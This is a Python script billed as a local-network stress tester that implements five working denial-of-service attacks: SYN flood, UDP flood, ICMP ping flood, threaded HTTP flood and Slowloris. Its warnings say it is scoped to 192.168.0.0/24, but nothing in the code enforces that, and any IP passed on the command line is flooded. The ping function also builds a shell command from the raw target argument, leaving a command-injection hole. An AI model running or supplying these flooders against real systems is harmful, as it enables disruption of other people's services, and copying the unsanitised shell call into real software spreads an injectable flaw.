#!/usr/bin/env python3
"""
Network Stress Test Tool — LOCAL NETWORK ONLY
Tests resilience of your own systems under load.

⚠️  WARNING: Only use against IPs you OWN.
⚠️  Using this against other people's systems is ILLEGAL.
⚠️  This tool is scoped to your local network (192.168.0.0/24).

Usage:
  python3 stress.py <ip> <method> [duration]

Methods:
  syn-flood    TCP SYN flood — exhausts connection table
  udp-flood    UDP packet flood — saturates bandwidth
  icmp-flood   Ping flood — CPU/network stress
  http-flood   HTTP GET requests — web server stress
  slow-loris   Slow HTTP headers — holds connections open

Examples:
  python3 stress.py 192.168.0.1 syn-flood 10
  python3 stress.py 192.168.0.193 http-flood 30
  python3 stress.py 192.168.0.1 icmp-flood 5
"""

import sys
import time
import socket
import threading
from datetime import datetime

# Warning: Only use against systems you OWN or have WRITTEN CONSENT to test.
# Using this against other people's systems is ILLEGAL.


def syn_flood(target_ip, duration):
    """SYN flood via raw sockets."""
    try:
        from scapy.all import IP, TCP, send
    except ImportError:
        print("  ❌ Scapy required: sudo pacman -S python-scapy")
        return

    print(f"\n  ⚡ SYN Flood on {target_ip} for {duration}s...")
    end = time.time() + duration
    count = 0

    while time.time() < end:
        try:
            pkt = IP(dst=target_ip) / TCP(dport=80, flags="S")
            send(pkt, verbose=False)
            count += 1
            if count % 100 == 0:
                print(f"     Sent {count} packets...", end="\r")
        except:
            break

    print(f"\n  ✅ Sent {count} SYN packets in {duration}s")


def udp_flood(target_ip, duration):
    """UDP packet flood."""
    print(f"\n  ⚡ UDP Flood on {target_ip} for {duration}s...")
    end = time.time() + duration
    count = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() < end:
        try:
            payload = b"A" * 1400
            sock.sendto(payload, (target_ip, 80))
            count += 1
            if count % 1000 == 0:
                print(f"     Sent {count} packets...", end="\r")
        except:
            break

    sock.close()
    print(f"\n  ✅ Sent {count} UDP packets in {duration}s")


def icmp_flood(target_ip, duration):
    """ICMP ping flood."""
    print(f"\n  ⚡ ICMP Flood on {target_ip} for {duration}s...")
    end = time.time() + duration
    count = 0

    while time.time() < end:
        try:
            result = __import__("os").system(
                f"ping -c1 -W1 -s 65507 {target_ip} >/dev/null 2>&1"
            )
            count += 1
            if count % 10 == 0:
                print(f"     Sent {count} pings...", end="\r")
        except:
            break

    print(f"\n  ✅ Sent {count} ICMP packets in {duration}s")


def http_flood(target_ip, duration):
    """HTTP GET flood using threads."""
    print(f"\n  ⚡ HTTP Flood on {target_ip} for {duration}s...")
    end = time.time() + duration
    count = 0
    lock = threading.Lock()

    def flooder():
        nonlocal count
        while time.time() < end:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((target_ip, 80))
                s.send(
                    b"GET / HTTP/1.1\r\nHost: "
                    + target_ip.encode()
                    + b"\r\nConnection: close\r\n\r\n"
                )
                s.recv(1024)
                s.close()
                with lock:
                    count += 1
            except:
                pass

    threads = []
    for _ in range(20):  # 20 concurrent threads
        t = threading.Thread(target=flooder, daemon=True)
        t.start()
        threads.append(t)

    for i in range(duration):
        time.sleep(1)
        with lock:
            print(f"     {count} requests sent...", end="\r")

    print(f"\n  ✅ Sent {count} HTTP requests in {duration}s")


def slow_loris(target_ip, duration):
    """Slowloris — hold connections open with partial HTTP headers."""
    print(f"\n  🐢 Slowloris on {target_ip} for {duration}s...")
    end = time.time() + duration
    sockets = []
    count = 0

    # Open many connections and keep them alive
    end_connect = time.time() + min(duration, 30)
    while time.time() < end_connect:
        try:
            s = socket.socket()
            s.settimeout(4)
            s.connect((target_ip, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
            sockets.append(s)
            count += 1
            print(f"     Opened {count} connections...", end="\r")
        except:
            break

    # Keep them alive with partial headers
    end_keep = time.time() + duration
    while time.time() < end_keep and sockets:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
                s.close()
        time.sleep(10)

    for s in sockets:
        s.close()
    print(f"\n  ✅ Used {count} connections in {duration}s")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].lower()
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    print(f"\n  🛡️  Network Stress Test")
    print(f"  {'=' * 40}")
    print(f"  Target:   {target}")
    print(f"  Method:   {method}")
    print(f"  Duration: {duration}s")
    print(f"  Time:     {datetime.now().strftime('%H:%M:%S')}")
    print(f"  {'=' * 40}")
    print(f"  ⚠️  ONLY use against YOUR systems")

    methods = {
        "syn-flood": syn_flood,
        "udp-flood": udp_flood,
        "icmp-flood": icmp_flood,
        "http-flood": http_flood,
        "slow-loris": slow_loris,
    }

    if method in methods:
        methods[method](target, duration)
    else:
        print(f"  ❌ Unknown method: {method}")
        print(f"     Available: {', '.join(methods.keys())}")
